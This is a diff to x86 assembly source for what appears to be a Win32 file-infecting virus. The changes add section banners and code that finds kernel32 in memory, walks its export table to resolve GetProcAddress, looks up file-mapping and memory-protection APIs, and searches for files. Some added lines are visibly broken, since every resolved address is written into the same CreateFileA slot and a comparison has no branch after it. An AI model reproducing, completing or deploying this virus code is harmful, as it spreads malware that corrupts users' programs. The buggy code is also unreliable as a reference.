@@ -32,9 +32,9 @@ delta:
 	sub eax,00001000h
 	mov [ebp+image_base],eax			; save image base
 
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;------------Find import section-------------;
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 	mov esi,[image_base+ebp]			; point on image base
 	add eax,3ch						; At offset 3ch is the dword 'header relocation'.This value here= offset begin (PE header)  
@@ -45,9 +45,9 @@ delta:
 	add eax,esi						; now point to import table (+ image_base)
 	add eax,12						; +CH (point to .dll)   
 	
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;------------Scan import-------------;
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
 find_kernel32:
 	xor ebx,ebx						; reset ebx
 	cmp dword ptr[eax],ebx				; cmp if value tai eax=0
@@ -88,7 +88,9 @@ find_MZ_in_kernel:
 	add esi,120						; move to export table
 	mov esi,[esi]					; get value
 	add esi,edi						; +image_base->esi point to the export table !!!
-	
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;------------Get Win API-------------;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;		
 find_API:
 	push ebp
 	call find_ProcAddress						; Find address of func GetProcAddress
@@ -117,14 +119,15 @@ find_API:
 	add eax,ebp
 	push eax
 	call [ebp+FindFirstFileAAddress]
+	cmp eax , 0
 	mov dword ptr[ebp+search_handle],eax
 	
 	
-	push dword ptr[ebp+virtual_out] 					; make 1st 1000 byte 
-	push 80h							      	; writeable
-	push 1000h									; 1000 bytes
-	push dword ptr[ebp+image_base]
-	call [ebp+VirtualProtectAddress]
+;	push dword ptr[ebp+virtual_out] 					; make 1st 1000 byte 
+;	push 80h							      	; writeable
+;	push 1000h									; 1000 bytes
+;	push dword ptr[ebp+image_base]
+;	call [ebp+VirtualProtectAddress]
 	
 find_first_file:
 	push dword ptr [ebp+Win32Data]
@@ -138,6 +141,10 @@ find_next_file:
 done_find:
 	ret
 	invoke ExitProcess,0
+	
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;---------------------------Check kernel32 function----------------------------------------;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;			
 is_it_kernel32: 				; check is it kernel32.dll
 	xor ecx,ecx				; reset ecx
 	mov ebx,dword ptr [eax]		; set ebx=[eax]
@@ -155,7 +162,9 @@ az2:
 	inc ecx				; else ecx+=1
 az3:	
 ret
-	
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;------------------- Get Address of GetProcAddress API-------------------------------------;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
 find_ProcAddress:
 	xor eax,eax
 	xor ecx,ecx
@@ -204,7 +213,9 @@ search_procadress_4:
 	mov ebp,[ebp]
 	add ebp,edi
 	ret
-	
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;------------------- Get Address of GetModuleHandle API -----------------------------------;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;		
 find_GetModuleHandle:
 	xor eax,eax
 	xor ecx,ecx
@@ -253,6 +264,9 @@ search_module_4:
 	mov ebp,[ebp]
 	add ebp,edi
 	ret	
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;------------------- Get Address of Win API function --------------------------------------;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
 find_APIAddress:
 	lea eax,offset FindFirstFileAStr
 	add eax,ebp
@@ -275,12 +289,34 @@ find_APIAddress:
 	call [ebp+GetProcAddressAddress]
 	mov [ebp+CreateFileAAddress],eax
 	
+	lea eax,offset CreateFileMappingStr 
+	add eax,ebp
+	push eax
+	push dword ptr [ebp+handle]
+	call [ebp+GetProcAddressAddress]
+	mov [ebp+CreateFileAAddress],eax
 	
-;	lea eax,offset kernel_string
-;	add eax,ebp
-;	push eax
-;	call [ebp+GetModuleHandleAddress]
-;	mov dword ptr [ebp+handle],eax
+	lea eax,offset CloseHandleStr  
+	add eax,ebp
+	push eax
+	push dword ptr [ebp+handle]
+	call [ebp+GetProcAddressAddress]
+	mov [ebp+CreateFileAAddress],eax
+	
+	lea eax,offset VirtualProtectStr
+	add eax,ebp
+	push eax
+	push dword ptr [ebp+handle]
+	call [ebp+GetProcAddressAddress]
+	mov [ebp+CreateFileAAddress],eax 
+	
+	lea eax,offset SetCurrentDirectoryStr
+	add eax,ebp
+	push eax
+	push dword ptr [ebp+handle]
+	call [ebp+GetProcAddressAddress]
+	mov [ebp+CreateFileAAddress],eax 
+	
 	ret	
 
 end_objecttable: 
@@ -333,7 +369,7 @@ APIName:
 	UnmapViewOfFileStr    		db    "UnmapViewOfFile", 0 
 	CloseHandleStr        		db    "CloseHandle", 0 
 	VirtualProtectStr    		db    "VirtualProtect", 0
-	
+	SetCurrentDirectoryStr		db	"SetCurrentDirectory", 0
 APIAddress:
 	FindNextFileAAddress    	 	dd    0h
 	FindFirstFileAAddress   	 	dd    0h
